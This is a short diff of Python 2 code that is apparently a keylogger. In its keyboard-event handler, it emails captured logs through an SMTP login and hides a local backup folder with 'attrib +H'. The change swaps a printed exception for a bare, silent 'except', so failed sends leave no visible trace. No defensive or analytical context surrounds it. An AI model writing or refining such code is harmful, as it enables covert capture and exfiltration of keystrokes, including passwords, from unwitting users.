@@ -159,9 +159,7 @@ def OnKeyboardEvent(event):
             SmtpServer.login(strEmailAc, strEmailPass)
             SmtpServer.sendmail(strEmailAc, strEmailAc, strEmail)
             SmtpServer.close()
-        except Exception as e:  # if the logs cannot be sent, save them to txt file to try again later
-
-            print e
+        except:  # if the logs cannot be sent, save them to txt file to try again later
             if not os.path.isdir(cPuffDir):  # if the screen dir doesnt exist, create it
                 os.makedirs(cPuffDir)
                 subprocess.Popen(["attrib", "+H", cPuffDir])  # make folder hidden
